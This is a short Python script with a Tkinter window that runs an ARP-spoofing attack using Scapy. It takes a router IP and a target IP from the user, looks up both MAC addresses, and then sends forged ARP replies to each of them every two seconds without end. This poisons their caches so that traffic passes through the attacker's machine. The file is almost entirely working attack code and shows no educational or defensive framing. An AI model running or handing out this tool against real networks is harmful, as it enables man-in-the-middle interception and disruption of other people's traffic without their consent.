from tkinter import *
import scapy.all as scapy
import time
import os


def submit():
    router_ip_entry = router_ip.get()
    target_ip_entry = target_ip.get()
    
    target_mac = str(get_mac_address(target_ip_entry))
    router_mac = str(get_mac_address(router_ip_entry))

    try:
        while True:
            spoof(router_ip_entry, target_ip_entry, router_mac, target_mac)
            time.sleep(2)
    except KeyboardInterrupt():
        print("closing ARP spoofing")
        exit(0)

def get_mac_address(ip_address):
    broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_layer = scapy.ARP(pdst=ip_address)
    get_mac_packet = broadcast_layer/arp_layer
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc 

def spoof(router_ip, target_ip, router_mac, target_mac):
    packet1 = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
    packet2 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    scapy.send(packet1, verbose=False)
    scapy.send(packet2, verbose=False)

window = Tk()
window.title("ARP Spoofing")
#window.geometry("500x500")
window.config(background="#000000")
if not 'SUDO_UID' in os.environ.keys():
    sudo_warning = Label(window, text="WARNING: RUN WITH SUDO!!!", font=("Arial Bold", 12), bg="#000000", fg="#00ff00")
    sudo_warning.pack(side=TOP)
else:
    pass

router_ip_text = Label(window, text="router ip", font=("Arial Bold", 12), bg="#000000", fg="#00ff00")
router_ip_text.pack(side=TOP)

router_ip = Entry(window, width=30, bg="#000000", fg="#ffffff")
router_ip.pack(side=TOP)

target_ip_text = Label(window, text="target ip", font=("Arial Bold", 12), bg="#000000", fg="#00ff00")
target_ip_text.pack(side=TOP)

target_ip = Entry(window, width=30, bg="#000000", fg="#ffffff")
target_ip.pack(side=TOP)

space_label = Label(text = " ", bg="#000000", fg="#ffffff")
space_label.pack(side=TOP)

cancel_button = Button(window, text="Cancel", width=10, bg="#000000", fg="#ffffff", command=window.destroy)
cancel_button.pack(side=BOTTOM)

submit_button = Button(window, text="Start Spoofing", font=("Arial Bold", 12), bg="#000000", fg="#ffffff", command=submit)
submit_button.pack(side=BOTTOM)

window.mainloop()